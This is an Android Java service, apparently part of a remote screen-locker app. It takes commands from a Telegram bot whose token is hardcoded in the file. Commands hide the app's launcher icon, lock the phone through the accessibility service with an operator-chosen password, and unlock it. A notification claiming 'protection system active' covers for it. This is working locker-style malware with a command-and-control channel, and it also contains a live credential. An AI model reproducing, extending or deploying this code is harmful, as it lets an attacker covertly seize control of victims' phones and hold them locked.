package com.example.touchlock;

import android.app.*;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    public static TouchLockService instance;
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    private OkHttpClient client;
    private long lastUpdateId = 0;
    private String adminChatId = ""; 

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        createNotificationChannel();
        startForeground(1, getMyNotification("Система защиты активна"));
        startPolling();
    }

    private void startPolling() {
        new Thread(() -> {
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Response response = client.newCall(new Request.Builder().url(url).build()).execute();
                    if (response.isSuccessful() && response.body() != null) {
                        JSONObject json = new JSONObject(response.body().string());
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = resultToMessage(results.getJSONObject(i));
                            if (update == null) continue;

                            String text = update.getString("text");
                            String[] parts = text.split(" ");
                            String cmd = parts[0].toLowerCase();

                            new Handler(Looper.getMainLooper()).post(() -> {
                                // 1. Команды управления ИКОНКОЙ (работают всегда)
                                if (cmd.equals("/hide")) {
                                    updateIconStatus(false);
                                    sendTelegramMessage("👻 Иконка скрыта из меню");
                                } 
                                else if (cmd.equals("/show")) {
                                    updateIconStatus(true);
                                    sendTelegramMessage("👁 Иконка возвращена в меню");
                                } 
                                
                                // 2. Команды БЛОКИРОВКИ (требуют Accessibility Service)
                                else if (TouchLockAccessibilityService.instance != null) {
                                    if (cmd.equals("/block")) {
                                        String pass = (parts.length > 1) ? parts[1] : "0000";
                                        TouchLockAccessibilityService.instance.lock(pass);
                                        sendTelegramMessage("🔒 Экран заблокирован. Пароль: " + pass);
                                    } else if (cmd.equals("/stop")) {
                                        TouchLockAccessibilityService.instance.unlock();
                                        sendTelegramMessage("🔓 Удаленная разблокировка выполнена");
                                    }
                                } else {
                                    // Если команда пришла, а Accessibility не включен
                                    if (cmd.equals("/block") || cmd.equals("/stop")) {
                                        sendTelegramMessage("❌ Ошибка: На телефоне не включены 'Специальные возможности'!");
                                    }
                                }
                            });
                        }
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    // Вспомогательный метод для парсинга сообщений и запоминания ID чата
    private JSONObject resultToMessage(JSONObject result) throws JSONException {
        if (!result.has("message")) return null;
        JSONObject msg = result.getJSONObject("message");
        adminChatId = msg.getJSONObject("chat").getString("id");
        return msg;
    }

    public void sendTelegramMessage(String message) {
        if (adminChatId.isEmpty()) return;
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + adminChatId + "&text=" + message;
                client.newCall(new Request.Builder().url(url).build()).execute();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void updateIconStatus(boolean show) {
        // Мы используем MainActivity.class, так как именно эта активность является "входной точкой" с иконкой
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("TouchLockChannel", "Status", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getMyNotification(String t) {
        return new Notification.Builder(this, "TouchLockChannel")
                .setContentTitle("Touch Blocker")
                .setContentText(t)
                .setSmallIcon(android.R.drawable.ic_secure)
                .setOngoing(true)
                .build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { instance = null; super.onDestroy(); }
}

